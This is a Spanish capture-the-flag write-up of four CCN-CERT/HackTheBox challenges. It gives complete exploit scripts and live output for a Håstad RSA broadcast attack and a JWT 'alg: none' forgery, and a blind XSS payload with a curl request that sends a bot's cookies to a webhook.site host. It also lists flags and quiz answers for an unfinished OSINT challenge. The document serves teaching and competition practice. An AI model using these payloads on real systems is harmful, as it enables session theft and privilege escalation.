
Oct 19, 2026 · @Serx

## Resumen ejecutivo

4 retos de la edición ATENEA-JORNADAS (CCN-CERT, jugada vía HackTheBox CTF): 3 resueltos con flag capturada y 1 (OSINT) en progreso, con 7 de 11 preguntas confirmadas.

| # | Reto | Categoría | Estado | Flag / resultado |
| --- | --- | --- | --- | --- |
| 1 | PSA Games | Crypto | ✅ Resuelto | `HTB{why_w0u1d_43$_P4dd1nG_k33p_m3$$4g3_s3cur3}` |
| 2 | unverified | Crypto | ✅ Resuelto | `HTB{always_check_the_integrity_of_the_JWT_tokens_d038ba88ce221407fb4b932c57340c68}` |
| 3 | Osuvox Forums | Web | ✅ Resuelto | `HTB{l00k_0uT_f0r_bl1nd_X55!!!}` |
| 4 | The Phantom Ledger | OSINT | 🟡 En progreso (8/11) | Sin flag final aún |

## Conceptos clave explicados desde cero

Antes de entrar en cada reto, estos son los fundamentos que hacen falta para entender *por qué* funcionan los ataques. Si ya los dominas, sáltate esta sección; si no, léela primero y el resto del informe tendrá mucho más sentido.

### RSA en una frase

RSA es un sistema de cifrado "asimétrico": hay una clave pública (que todo el mundo puede ver) para cifrar, y una clave privada (secreta) para descifrar. Se basa en tres números:

- **`n` (el módulo):** un número enorme que es el producto de dos primos secretos, `n = p × q`. Su seguridad depende de que factorizar `n` (encontrar `p` y `q`) es prácticamente imposible si es lo bastante grande.
- **`e` (el exponente público):** el número con el que se cifra. Valores típicos y seguros son 65537.
- **`d` (el exponente privado):** el número con el que se descifra, derivado de `p`, `q` y `e`.

Cifrar un mensaje `m` es calcular `c = m^e mod n`. Descifrar es `m = c^d mod n`. La idea es que sin `d` (que requiere factorizar `n`) no puedes dar marcha atrás... **salvo que se cometa un error de implementación**, que es justo lo que explotan los retos de crypto.

### Por qué un exponente `e` pequeño es peligroso (la clave del reto 1)

Imagina que elevas un número pequeño al cubo (`e = 3`): `5^3 = 125`. Si el resultado (125) es más pequeño que el módulo `n`, entonces el `mod n` no hace nada — el resultado "no da la vuelta". En ese caso, para recuperar el mensaje original solo tendrías que hacer la raíz cúbica de 125, que es 5. Sin clave privada, sin factorizar nada.

En la práctica `m` suele ser mayor que `n`, así que `m^e` **sí** da la vuelta módulo `n` y esto no se puede hacer directamente. Pero si el **mismo mensaje** se cifra con el **mismo `e` pequeño** bajo **varios `n` distintos**, el Teorema Chino del Resto (CRT) permite "recomponer" `m^e` como si nunca hubiera dado la vuelta, y entonces sí se puede sacar la raíz. Eso es el **ataque de Håstad**, y es exactamente la trampa del reto PSA Games.

### Qué es un JWT y qué es la "firma" (la clave del reto 2)

Un JWT (JSON Web Token) es un "carné" digital que un servidor te da para demostrar quién eres sin tener que volver a meter la contraseña en cada petición. Tiene tres partes separadas por puntos: `header.payload.firma`.

- El **header** dice qué algoritmo se usó para firmarlo (por ejemplo `HS256`).
- El **payload** lleva tus datos (`username`, `is_admin`, etc.).
- La **firma** es un sello criptográfico que solo el servidor puede generar, usando una clave secreta (`SECRET_KEY`). Sirve para que, si alguien altera el payload (por ejemplo cambia `is_admin: false` a `true`), la firma deje de cuadrar y el servidor lo rechace.

El header y el payload **no van cifrados**, solo codificados en base64 (que es reversible por cualquiera). Lo único que impide falsificar un token es la firma. Por eso el ataque clásico "`alg: none`" consiste en decirle al servidor "este token no lleva firma" y rezar para que el servidor sea tan ingenuo como para aceptarlo sin comprobar nada — que es justo el fallo del reto unverified.

### Qué es un XSS y qué pinta un "bot" (la clave del reto 3)

XSS (Cross-Site Scripting) es cuando consigues que una web ejecute JavaScript tuyo en el navegador de otra persona. Pasa cuando una web coge algo que tú escribes (un comentario, un parámetro de la URL) y lo mete en la página **sin limpiarlo**, de forma que el navegador lo interpreta como código en vez de como texto.

¿Por qué es grave? Porque ese JavaScript corre con los permisos de la víctima: puede leer sus cookies de sesión, hacer peticiones en su nombre, robarle la cuenta. En los CTF aparece a menudo un "bot": un navegador automatizado que simula ser un administrador con datos valiosos (aquí, una cookie con la flag). Tu objetivo es inyectar JavaScript en una página que el bot vaya a visitar, para que al visitarla ejecute tu código y te envíe su cookie. Como tú no ves la ejecución directamente (solo recibes el resultado por un canal externo), se llama **XSS ciego**.

## Reto 1 (Crypto): PSA Games

**Enunciado:** "To obtain the second key, you must face a challenge set forth by the creator. The challenge involves a game called PSA, which uses the PKCS#7 padding scheme and generates varying versions of a secret passphrase. Can you uncover the correct passphrase and get the key?"

**Por qué el enunciado engaña a propósito.** Menciona PKCS#7 padding en primer plano, lo que invita a pensar en un ataque de *padding oracle* (típico contra AES-CBC). Pero el código fuente (`server.py`) muestra que en realidad se usa **RSA**, no AES, y el padding PKCS#7 solo se aplica al mensaje antes de cifrarlo — es una distracción. La pista real está en la otra frase: "genera varias versiones de una passphrase secreta", es decir, el mismo mensaje se cifra repetidamente con **claves distintas**.

**Lectura del código fuente.** `server.py` define una clase `PSA` con `bit_size = 512` y, sobre todo, **`e = 11`** fijo como exponente público RSA. Cada vez que el menú ofrece "Encrypt the flag", el servidor:

1. Rellena la FLAG con PKCS#7 (`pad(msg, 16)`).
2. Genera un **módulo RSA nuevo** (`p`, `q` primos de 256 bits cada uno, `n = p*q`), comprobando que `gcd(e, (p-1)(q-1)) == 1`.
3. Cifra: `c = m^11 mod n`.
4. Devuelve `(c, n)` en hexadecimal.

Esto es la receta exacta del **ataque de Håstad's broadcast**: cuando el mismo mensaje `m` se cifra con el mismo exponente público bajo (`e` pequeño, aquí 11) pero **módulos `n` distintos**, con al menos `e` pares `(c_i, n_i)` se puede recuperar `m` sin romper ninguna clave privada individual, siempre que `m^e` sea menor que el producto de todos los módulos usados (lo cual se cumple aquí: la FLAG paddeada mide mucho menos que 512 bits, y usamos 11 módulos de 512 bits cada uno).

**Por qué funciona matemáticamente (el porqué, no solo el cómo).** Por el Teorema Chino del Resto (CRT), dado un sistema de congruencias `x ≡ c_i (mod n_i)` con los `n_i` coprimos entre sí, existe una única solución `x` módulo `N = n_1·n_2·...·n_11`. Como `c_i = m^e mod n_i` para todo `i`, esa solución única es exactamente `x = m^e mod N`. Y como `m^e < N` (por los tamaños de bits), no hay "vuelta" módulo `N`: `x` es literalmente `m^e` como entero, sin resto. Por tanto basta aplicar una **raíz entera e-ésima** a `x` para recuperar `m` tal cual — sin necesitar factorizar ningún `n_i` ni conocer ninguna clave privada. El PKCS#7 del enunciado nunca entra en juego como vector de ataque; solo hay que quitarlo al final con `unpad()` porque formaba parte del mensaje original.

**Explotación paso a paso (`exploit_psa.py`):**

1. Conectar al servicio (`154.57.164.78:43595`) y consumir el banner/prompt inicial.
2. Enviar `1` (opción "Encrypt the flag") **11 veces** (`NEEDED = E = 11`), extrayendo con una regex los dos valores hexadecimales `(c, n)` de cada respuesta. Se descartan módulos repetidos por si acaso.
3. Aplicar CRT (`sympy.ntheory.modular.crt`) sobre las 11 parejas para obtener `m_e = m^11 mod N`.
4. Calcular la raíz entera 11-ésima de `m_e` por búsqueda binaria (`iroot`), ya que Python no tiene una raíz entera exacta nativa para exponentes grandes de forma fiable.
5. Convertir el entero resultante a bytes y quitar el padding PKCS#7 (`unpad(msg_padded, 16)`) para obtener la FLAG en texto plano.

**Resultado:**

```
HTB{why_w0u1d_43$_P4dd1nG_k33p_m3$$4g3_s3cur3}
```

Que se lee "why would AES padding keep message secure" — resumen exacto de la trampa del enunciado: el PKCS#7 no aportaba ninguna seguridad real frente a este ataque, porque el fallo estaba en reutilizar el mismo mensaje bajo un exponente bajo con módulos distintos.

**Script completo de validación local (`test_server.py`)**, usado antes de atacar el servidor remoto, para confirmar que el ataque de Håstad funcionaba sobre una réplica controlada de la lógica del reto (mismo `e=11`, mismo padding) antes de gastar intentos contra la instancia real:

```python
from Crypto.Util.number import bytes_to_long, getPrime, GCD
from Crypto.Util.Padding import pad

FLAG = b"HTB{test_flag_for_local_validation_of_hastad_attack}"

WELCOME = '''Welcome to my custom PSA cryptosystem!
In this cryptosystem, the message is PKCS#7 padded and then encrypted with RSA.
They say padding makes encryption more secure, right? ;)'''

MENU = '''
[1] Encrypt the flag
[2] Exit
'''


class PSA:
    def __init__(self):
        self.bit_size = 512
        self.e = 11

    def gen_modulus(self):
        while True:
            p = getPrime(self.bit_size // 2)
            q = getPrime(self.bit_size // 2)
            if GCD(self.e, (p - 1) * (q - 1)) == 1:
                break
        return p * q

    def encrypt(self, msg):
        m = bytes_to_long(pad(msg, 16))
        n = self.gen_modulus()
        c = pow(m, self.e, n)
        return c, n


def main():
    psa = PSA()
    print(WELCOME)
    while True:
        try:
            print(MENU)
            opt = input('> ')
            if opt == '1':
                enc, modulus = psa.encrypt(FLAG)
                print(f"\n{hex(enc)}\n{hex(modulus)}")
            elif opt == '2':
                print('Bye.')
                exit(1)
            else:
                print('\nInvalid option!')
        except:
            print('\n\nSomething went wrong.')
            exit(1)


if __name__ == '__main__':
    main()
```

**Script de explotación completo (`exploit_psa.py`):**

```python
#!/usr/bin/env python3
"""
Hastad's broadcast attack contra PSA Games.

El servidor cifra SIEMPRE el mismo mensaje (FLAG paddeada con PKCS#7)
con exponente fijo e=11, pero genera un modulo RSA nuevo cada vez.
Con e pares (cifrado, modulo) distintos basta para recuperar el mensaje
via CRT + raiz entera, sin romper ninguna clave privada.
"""
import sys
from pwn import remote
from sympy.ntheory.modular import crt
from Crypto.Util.Padding import unpad

HOST = sys.argv[1] if len(sys.argv) > 1 else "154.57.164.78"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 43595
E = 11
NEEDED = E  # con e=11 necesitamos al menos 11 pares

import re
HEX_RE = re.compile(rb'0x[0-9a-fA-F]+')

def get_pair(conn):
    # No usamos sendlineafter aqui: ya consumimos el prompt "> " anterior
    # al leer con recvuntil, asi que esperar otro antes de enviar provoca
    # un deadlock (el prompt solo vuelve a aparecer DESPUES de nuestro envio).
    conn.sendline(b'1')
    data = conn.recvuntil(b'> ', timeout=10)
    hexes = HEX_RE.findall(data)
    c = int(hexes[0], 16)
    n = int(hexes[1], 16)
    return c, n

def main():
    conn = remote(HOST, PORT)
    conn.recvuntil(b'> ')  # consume el banner + el primer menu/prompt

    pairs = []
    seen_moduli = set()
    while len(pairs) < NEEDED:
        c, n = get_pair(conn)
        if n in seen_moduli:
            continue  # por si acaso se repite un modulo, lo descartamos
        seen_moduli.add(n)
        pairs.append((c, n))
        print(f"[+] par {len(pairs)}/{NEEDED}  n={hex(n)[:20]}...")

    conn.close()

    cs = [c for c, n in pairs]
    ns = [n for c, n in pairs]

    # CRT: encuentra m_e tal que m_e = c_i (mod n_i) para todos los i
    # => m_e = m^e mod (n1*n2*...*nE)
    m_e, _ = crt(ns, cs)
    m_e = int(m_e)

    # Como m^E < n1*n2*...*nE (si m es menor que cada modulo, que lo es
    # al tener 512 bits cada uno y el mensaje ser mucho mas corto),
    # la raiz E-esima entera de m_e es exactamente m, sin resto.
    m = iroot(m_e, E)

    msg_padded = m.to_bytes((m.bit_length() + 7) // 8, 'big')
    print("[padded]", msg_padded)

    try:
        flag = unpad(msg_padded, 16)
    except Exception as e:
        print("[!] unpad fallo:", e)
        flag = msg_padded

    print("[FLAG]", flag)

def iroot(x, n):
    """raiz entera n-esima exacta de x (x = m^n)"""
    if x == 0:
        return 0
    hi = 1
    while hi ** n <= x:
        hi *= 2
    lo = hi // 2
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if mid ** n <= x:
            lo = mid
        else:
            hi = mid - 1
    return lo

if __name__ == "__main__":
    main()
```

**Salida real de la ejecución contra el servidor:**

```
$ python3 exploit_psa.py 154.57.164.78 43595
[+] Opening connection to 154.57.164.78 on port 43595: Done
[+] par 1/11 n=0x638bd67ff66c58f92b...
[+] par 2/11 n=0x64307846556efe3eb8...
[+] par 3/11 n=0x90c5b252510c0e13d1...
[+] par 4/11 n=0x9c3cef8d7ded1de7e7...
[+] par 5/11 n=0x67c6b7782666d7a42d...
[+] par 6/11 n=0x94c6313d4f2dad529a...
[+] par 7/11 n=0x7c81b54de99cb1a01a...
[+] par 8/11 n=0x8774fd5f4848c6c6ad...
[+] par 9/11 n=0x80558d4b314971666b...
[+] par 10/11 n=0xaa6ace342af4959680...
[+] par 11/11 n=0x5b0e721038955c25a8...
[*] Closed connection to 154.57.164.78 port 43595
[padded] b'HTB{why_w0u1d_43$_P4dd1nG_k33p_m3$$4g3_s3cur3}\x02\x02'
[FLAG] b'HTB{why_w0u1d_43$_P4dd1nG_k33p_m3$$4g3_s3cur3}'
```

## Reto 2 (Crypto): unverified

**Enunciado:** "Sometimes, it's enough to say you're important. The system won't ask questions if you sound convincing." — ya avisa de que el fallo es de **confianza mal depositada**, no de criptografía rota en sí.

**La aplicación.** Una API Flask con tres rutas (`/register`, `/login`, `/dashboard`) que usan JWT para la sesión. El archivo clave es `crypto/jwt.py`, que define **dos funciones distintas** para tratar tokens:

- `verify_token(token)`: llama a `jwt.decode(token, SECRET_KEY, algorithms=['HS256'])`. Exige que el token esté firmado con HS256 usando la `SECRET_KEY` real del servidor. Si alguien manipula el token sin conocer esa clave, la verificación falla.
- `decode_payload(token)`: **no comprueba ninguna firma**. Solo exige que el campo `alg` del header diga literalmente `"none"`, y entonces llama a `jwt.decode(token, algorithms=['none'], options={'verify_signature': False})`, que acepta el contenido del token tal cual, sin validar nada.

**Por qué el fallo no está en el algoritmo de firma en sí.** HS256 en `verify_token` está implementado correctamente. El problema es de **diseño del flujo**: dos rutas HTTP distintas confunden a qué función confiar.

- `/login` llama a `verify_token` sobre el token recibido. Si la firma es válida, guarda `session['user']` (cookie de sesión de Flask).
- `/dashboard` primero exige que exista `session['user']` (sesión ya creada en `/login`). Pero para leer el **contenido** del token que llega en la cabecera `Authorization` de esa misma petición, usa `decode_payload`, **no** `verify_token`. El propio comentario del código lo delata: "the token was already verified when user logged in, no need to verify again". Esa es la falacia: el servidor asume que, como ya se verificó un token en `/login`, cualquier token que llegue después en `/dashboard` también es de fiar — pero nada obliga a que sea el mismo token, y `/dashboard` nunca comprueba su firma.

**El ataque: JWT "alg: none".** Es un ataque clásico contra JWT: si una implementación no fuerza explícitamente una lista de algoritmos permitidos (o la fuerza mal, como aquí en `decode_payload`), un atacante puede reescribir el header del token anunciando `"alg": "none"` y dejar la firma vacía. Como `decode_payload` solo comprueba que el header diga eso, el payload se acepta sin validar que provenga realmente del servidor — incluido el campo `is_admin`.

**Explotación paso a paso (`exploit_unverified.py`):**

1. `POST /register` con usuario (10-20 car.) y contraseña (8-16 car.) válidos. El servidor responde con un token real, firmado con HS256, con `is_admin: false`.
2. `POST /login` enviando ese token real en `Authorization: Bearer <token>`. Como la firma es válida, el servidor crea la sesión (`session['user']`) y la devuelve como cookie. Esta cookie hay que conservarla con `requests.Session()` para el siguiente paso.
3. **Forjar un token propio, sin firmar:** header `{"alg": "none", "typ": "JWT"}` y payload `{"username": "<usuario>", "is_admin": true}`. El tercer segmento (la firma) se deja vacío.
4. `POST /dashboard` con la cookie de sesión del paso 2 y, en la cabecera `Authorization`, el token forjado del paso 3. Como `/dashboard` solo comprueba que haya sesión activa (ya la hay) y usa `decode_payload` para leer el token del header (que no verifica firma), acepta `is_admin: true` y devuelve la flag.

**Detalle técnico que costó encontrar (el "por qué" de un error que no parecía ser del JWT):** un JWT normal se codifica en base64url (`-`/`_`, sin `=` de relleno). Pero `decode_payload` usa `base64.b64decode()` a secas sobre el primer segmento del token, que es la variante **estándar** de base64 (`+`/`/`, con padding `=` obligatorio). Si el header se codifica en base64url sin padding (como hace cualquier librería JWT estándar), `decode_payload` falla con `binascii.Error: Incorrect padding` y el servidor responde 500. Esto llevó a montar el reto en local con Docker/Flask directo para ver el traceback completo (el servidor remoto, con `debug=False`, solo devolvía un 500 genérico sin detalle) y confirmar que el fallo no era lógico sino de codificación. La solución fue codificar el header y el payload del token forjado con `base64.b64encode()` normal, manteniendo el `=` de relleno, en vez de la función `urlsafe_b64encode` que usan las librerías JWT estándar.

**Lección general:** si un exploit casi funciona pero da 500, no asumir que el fallo lógico está mal planteado — puede ser un detalle de codificación/formato que solo se ve con el traceback completo, montando el reto en local si el servidor remoto no lo muestra.

**Resultado:**

```
HTB{always_check_the_integrity_of_the_JWT_tokens_d038ba88ce221407fb4b932c57340c68}
```

El propio texto de la flag resume la lección: siempre hay que verificar la integridad (firma) de un JWT antes de confiar en su contenido, sin importar qué función lo haya verificado antes en otro punto del flujo.

**Código fuente clave del reto (`crypto/jwt.py`):**

```python
SECRET_KEY = os.urandom(16).hex()

def create_session(username):
    return jwt.encode({'username': username, 'is_admin': False}, key=SECRET_KEY, algorithm='HS256')

def verify_token(token):
    try:
        username = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])['username']
        return True, username
    except:
        return False, None

def decode_payload(token):
    header = json.loads(b64decode(token.split('.')[0].encode()))
    if 'alg' not in header:
        return None
    if header['alg'] != 'none':
        return None
    return jwt.decode(token, algorithms=['none'], options={'verify_signature': False})
```

**`views.py` (el endpoint `/dashboard`, donde está el fallo):**

```python
@bp.route('/dashboard', methods=['POST'])
def dashboard():
    if 'user' not in session:
        return jsonify({'status_code': 403, 'error': 'You need to verify your token first.'})
    token = headers['Authorization'].split('Bearer ')[1]
    # the token was already verified when user logged in, no need to verify again
    payload = decode_payload(token)
    if payload['is_admin']:
        return jsonify({..., 'content': f"... {open('/flag.txt').read()} ..."})
```

**Script de explotación final, ya corregido (`exploit_unverified.py`):**

```python
import requests
import base64
import json
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "154.57.164.81"
PORT = sys.argv[2] if len(sys.argv) > 2 else "36176"
BASE = f"http://{HOST}:{PORT}"

s = requests.Session()

def b64url(data: bytes) -> str:
    # decode_payload() en el servidor usa base64.b64decode normal, SIN
    # manejo urlsafe y SIN relleno automatico, asi que hay que emitir
    # base64 estandar CON padding (no base64url, no recortado).
    return base64.b64encode(data).decode()

# 1. Registro (usuario 10-20 car., contrasena 8-16 car.)
username = "serxhack_1234"
password = "password1"

r = s.post(f"{BASE}/register", json={"username": username, "password": password})
print("[register]", r.status_code, r.text)
real_token = r.headers.get("Authorization", "").split("Bearer ")[-1]
print("[real token]", real_token)

# 2. Login con el token real (firma valida) -> crea la cookie de sesion
r = s.post(f"{BASE}/login", headers={"Authorization": f"Bearer {real_token}"})
print("[login]", r.status_code, r.text)
print("[cookies]", s.cookies.get_dict())

# 3. Forjar un token alg:none con is_admin: True
header = {"alg": "none", "typ": "JWT"}
payload = {"username": username, "is_admin": True}

forged = f"{b64url(json.dumps(header).encode())}.{b64url(json.dumps(payload).encode())}."
print("[forged token]", forged)

# 4. Pedir /dashboard con la cookie de sesion del paso 2 y el token forjado
r = s.post(f"{BASE}/dashboard", headers={"Authorization": f"Bearer {forged}"})
print("[dashboard]", r.status_code, r.text)
```

**El camino de depuración (por qué no fue directo):**

1. Con la versión inicial (`base64.urlsafe_b64encode` para codificar header/payload, como hace cualquier librería JWT), `/dashboard` devolvía **500 Internal Server Error** sin más detalle, porque el servidor remoto corre con `debug=False`.
2. Para ver el traceback real, se montó el código del reto **en local** (extraído del Dockerfile del paquete del reto) ejecutando `python3 app.py` directamente con Flask, y se lanzó el mismo exploit contra `127.0.0.1:1337`.
3. El traceback local mostró exactamente dónde fallaba:

```
File ".../crypto/jwt.py", line 17, in decode_payload
    header = json.loads(b64decode(token.split('.')[0].encode()))
File "/usr/lib/python3.13/base64.py", line 88, in b64decode
    return binascii.a2b_base64(s, strict_mode=validate)
binascii.Error: Incorrect padding
```

4. Eso confirmó que el fallo no estaba en la lógica del ataque (el `alg: none` sí se aceptaba) sino en un detalle de codificación: `decode_payload` esperaba base64 **estándar con padding**, no base64url sin padding. Se corrigió `b64url()` para usar `base64.b64encode()` en vez de la variante urlsafe, y el exploit funcionó tanto en local como contra el servidor remoto.

**Salida real contra el servidor remoto:**

```
$ python3 exploit_unverified.py 154.57.164.81 36176
[register] 200 {"status_code":200,"user":"serxhack_1234"}
[real token] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNlcnhoYWNrXzEyMzQi...
[login] 200 {"msg":"Welcome, serxhack_1234!","status_code":200}
[cookies] {'session': 'eyJ1c2VyIjoic2VyeGhhY2tfMTIzNCJ9...'}
[forged token] eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0=.eyJ1c2VybmFtZSI6ICJzZXJ4aGFjaz...
[dashboard] 200 {...,"content":"... HTB{always_check_the_integrity_of_the_JWT_tokens_d038ba88ce221407fb4b932c57340c68} ..."}
```

## Reto 3 (Web): Osuvox Forums

**Enunciado:** "i-R0k and I0I created a marketplace for Oasis, continuously degrading players' experience by creating Pay to Win conditions. Can you help the High Five to take it down?"

**Primera pista de la arquitectura: `bot.js` + `report.html`.** Ver estos dos archivos juntos en el código fuente es casi siempre señal de un reto de **XSS con bot administrador**: un usuario "normal" reporta una URL/ID, y un bot automatizado (con privilegios o datos sensibles) la visita. El objetivo es inyectar JavaScript que se ejecute en el navegador del bot para robarle algo — típicamente una cookie de sesión.

**Qué controla el bot (`bot.js`).** Usa Puppeteer para lanzar un navegador headless, le planta una cookie `flag` con el valor real de la flag en el dominio `127.0.0.1:1337`, y navega a `http://127.0.0.1:1337/posts/${id}` — siendo `id` un parámetro que el atacante controla por completo. Confirma la hipótesis: el bot visita `/posts/<id>` con la flag puesta como cookie, así que el objetivo es inyectar JS en esa página para que, cuando el bot la visite, nos mande esa cookie a un servidor nuestro.

**Grieta 1 — el servidor no valida el `id`.** En `routes/index.js`, el endpoint `POST /api/report` coge el `id` que el usuario manda en el body **sin validar que sea numérico** y lo pasa tal cual a `bot.visitPost(id)`, que a su vez lo mete en la URL que visita el bot (`/posts/${id}`). Esto significa que podemos mandar como `id` algo como `1?search=<payload>`, y el bot acabará visitando `/posts/1?search=<payload>` — una URL con un parámetro de query extra que nosotros controlamos.

**Grieta 2 — el cliente no escapa el parámetro `search`.** En `static/js/forum.js`, la función `parseParams` (cargada en todas las páginas, incluida `post.html`) lee los parámetros de la URL actual. Si existe `search`, se ejecuta:

```js
$('#search-msg').innerHTML = `Search results for "${params.search}" :`;
```

Esto inyecta el valor de `search` directamente en el DOM vía `innerHTML`, **sin ningún escapado**. Como `post.html` también carga `forum.js`, cualquier `id` que apunte a un post válido (para que la página renderice bien) y lleve además un `?search=<payload>` acaba ejecutando ese payload como HTML/JS en el navegador que visite esa URL.

**Por qué index.html sí estaba a salvo (y por qué eso no bastaba).** `index.html` usa autoescape de Nunjucks sobre los datos de la base de datos (`post.description`, etc.), así que un post normal no sirve de vector por esa vía directa, y no hay endpoint para crear posts nuevos con contenido propio. Por eso el fallo real no estaba en "meter HTML en un post" sino en combinar la falta de validación del `id` en el servidor (grieta 1) con la falta de escapado del parámetro `search` en el cliente (grieta 2): dos fallos independientes que, atados entre sí, forman la cadena de explotación completa.

**Atándolo todo: patrón de razonamiento reutilizable para retos de XSS+bot:**

1. ¿Quién visita qué? (el bot admin visita `/posts/<id>` con datos sensibles en la sesión/cookies)
2. ¿Qué controla el atacante? (el `id` que se manda a `/api/report`, sin validar)
3. ¿Dónde se imprime algo del usuario sin escapar? (`search` en `forum.js`, vía `innerHTML`)
4. ¿Cómo se alimenta uno al otro? (meter el propio parámetro `search` dentro del `id` que recibe el bot)
5. El resto es mecánica: robar `document.cookie` desde el JS inyectado y mandarla a un sitio externo que controlemos.

**Explotación paso a paso:**

1. Montar un receptor público para capturar la petición saliente del bot (en este caso, [webhook.site](https://webhook.site), ya que el proxy de salida del entorno de trabajo bloqueaba el acceso directo — esta parte se hizo desde una máquina con salida normal a internet).
2. Construir el `id` malicioso: `1?search=<img src=x onerror="fetch('https://webhook.site/<uuid>?c='+document.cookie)">` (un `<img>` con `src` inválido dispara `onerror`, que ejecuta el JS sin necesitar interacción del usuario ni abrir un `<script>` que algunos filtros bloquean).
3. `POST /api/report` con ese `id` en el body. El servidor lo pasa sin validar a `bot.visitPost(id)`.
4. El bot navega a `/posts/1?search=<payload>` **con la cookie `flag` puesta**. `forum.js` lee `search` de la URL y lo inyecta vía `innerHTML` sin escapar → el navegador del bot ejecuta el `onerror` del `<img>` falso → se envía `document.cookie` (que incluye la flag) al webhook.
5. Revisar el webhook: ahí llega la cookie con la flag.

**Por qué es un XSS "ciego" (blind XSS).** El atacante nunca ve la ejecución del payload directamente — el bot lo ejecuta en un contexto propio, sin devolver nada al atacante por la vía normal de la petición HTTP. Solo se observa el efecto a través de un canal externo (aquí, el webhook), lo cual es típico en ataques dirigidos contra moderadores/administradores automatizados en vez de contra el propio navegador del atacante.

**Resultado:**

```
HTB{l00k_0uT_f0r_bl1nd_X55!!!}
```

**Código fuente clave del reto:**

`challenge/bot.js` (qué visita el bot y con qué cookie):

```js
const puppeteer = require('puppeteer');

const visitPost = async (id) => {
  try {
    const browser = await puppeteer.launch(browser_options);
    let context = await browser.createIncognitoBrowserContext();
    let page = await context.newPage();
    await page.setCookie({
      name: "flag",
      'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}',
      domain: "127.0.0.1:1337"
    });
    await page.goto(`http://127.0.0.1:1337/posts/${id}`, {
      waitUntil: 'networkidle2',
      timeout: 5000
    });
    await browser.close();
  } catch(e) {
    console.log(e);
  }
};
module.exports = { visitPost };
```

`challenge/routes/index.js` (el endpoint que no valida el `id`):

```js
router.post('/api/report', async (req, res) => {
  const { id } = req.body;
  if (botVisiting) return res.status(403).send(response('Please wait for the previous report to process first!'));
  if (id) {
    botVisiting = true;
    return bot.visitPost(id)
      .then(() => {
        botVisiting = false;
        return res.send(response('Report received successfully!'));
      })
      .catch(e => {
        console.log(e);
        botVisiting = false;
        return res.status(403).send(response('Something went wrong, please try again!'));
      });
  }
  return res.status(500).send(response('Missing required parameters!'));
});
```

`challenge/static/js/forum.js` (dónde se inyecta `search` sin escapar):

```js
let params = parseParams(location.href);
if (params.hasOwnProperty('search')) {
  $('#search-res').style.display = 'block';
  $('#search-msg').innerHTML = `Search results for "${params.search}" :`;
  // todo: add search feature
}
```

**Construcción del payload, explicada:**

```
id = 1?search=<img src=x onerror="fetch('https://webhook.site/<uuid>?c='+document.cookie)">
```

- `1` — un ID de post válido (necesario para que `/posts/1` renderice sin error, ya que `post.html` también comprueba que el post exista).
- `?search=...` — el parámetro extra que `forum.js` lee de la URL actual del bot y mete sin escapar en `innerHTML`.
- `<img src=x onerror="...">` — como `src=x` no es una imagen válida, el navegador dispara el evento `onerror`, que ejecuta JavaScript arbitrario sin necesitar un tag `<script>` (que algunos filtros CSP/XSS bloquean más fácilmente) ni interacción del usuario.
- `fetch('https://webhook.site/<uuid>?c='+document.cookie)` — envía la cookie completa del navegador del bot (que incluye `flag=HTB{...}`) como query string a un endpoint externo que controlamos.

**Petición real enviada:**

```bash
curl -X POST http://154.57.164.77:33201/api/report \
  -H "Content-Type: application/json" \
  -d '{"id": "1?search=<img src=x onerror=\"fetch(%27https://webhook.site/3e990e95-386a-49a5-b753-a109e43348db?c=%27+document.cookie)\">"}'
```

**Resultado observado en el webhook:** llegó una petición GET con `document.cookie` en el query string, conteniendo `flag=HTB{l00k_0uT_f0r_bl1nd_X55!!!}` — confirmando que el bot ejecutó el `onerror` del `<img>` inyectado y exfiltró su propia cookie.

## Reto 4 (OSINT, en progreso): The Phantom Ledger

**Enunciado:** "PRIORITY INTEL: Marcus Chen appeared in Indy's final search history before his disappearance. This self-proclaimed MIT graduate and blockchain CEO emerged weeks before the Sable Surge attacks, claiming to develop Chrono Key-compatible encryption. Use OSINT-OS to determine: Is Chen a Serpent Society operative using ChainVault Solutions as cover? Or legitimate help in our fight? 12 questions separate ally from enemy."

**El entorno ("OSINT-OS").** Es una máquina simulada tipo escritorio, con varias herramientas pre-instaladas: File Manager, Firefox (hardened), LinkedIn Analyzer, SpiderFoot, Maltego CE y Terminal (este último, decorativo/no interactivo en esta edición). No hay URL real ni DevTools funcionales — toda la investigación se hace navegando por la interfaz que la propia app ofrece, sin trucos de manipulación de parámetros.

**Por qué investigar así, en vez de ir directo a las respuestas:** cada herramienta simulada representa una técnica OSINT real (verificación de credenciales académicas, búsqueda inversa de imágenes, análisis de metadatos, WHOIS, análisis de repositorios de código), y el reto enseña a cruzar varias fuentes independientes antes de concluir algo — el mismo patrón que un analista real seguiría para decidir si "Marcus Chen" es una identidad fabricada.

### Las 11 preguntas (de las 12 que marca el enunciado se trabajaron 11 en el cuestionario) y su estado

| # | Pregunta | Estado | Respuesta |
| --- | --- | --- | --- |
| 1 | Según los resultados de "Search Analysis Alert", ¿cuál es el estado de los registros MIT de Marcus Chen? (tal cual aparece) | ⏳ Pendiente | `MIT education claim: UNVERIFIED` (candidata, pero texto exacto aún sin confirmar en el formato "Search Analysis Alert") |
| 2 | Citas totales en los resultados de Google Scholar para publicaciones de Marcus Chen afiliado a MIT en blockchain/criptografía (2012-2024) | ✅ | `0` |
| 3 | Resultado exacto de la búsqueda en Google Scholar de artículos que mencionan a Marcus en relación con logros en blockchain | ✅ | `No publications matching search criteria.` |
| 4 | ID de la base de datos de fotos de stock que identifica la búsqueda inversa de imagen del perfil de LinkedIn | ✅ | `Shutterstock #2847293` |
| 5 | Nombre de archivo original (antes de usarse en LinkedIn) según el análisis de metadatos de la imagen | ✅ | `business-portrait-asian-male-2847293.jpg` |
| 6 | % de conexiones de Chen que son profesionales de blockchain verificados, según el LinkedIn Connection Authenticity Report | ✅ | `4%` |
| 7 | Hash SHA-256 del fragmento de código más copiado, según el análisis de similitud de código de GitHub | ⏳ Pendiente | — |
| 8 | Email asociado al primer commit en el historial de GitHub de Marcus Chen | ⏳ Pendiente | — |
| 9 | Organización registradora (WHOIS) que detectó SpiderFoot | ✅ | `NameCheap Inc.` |
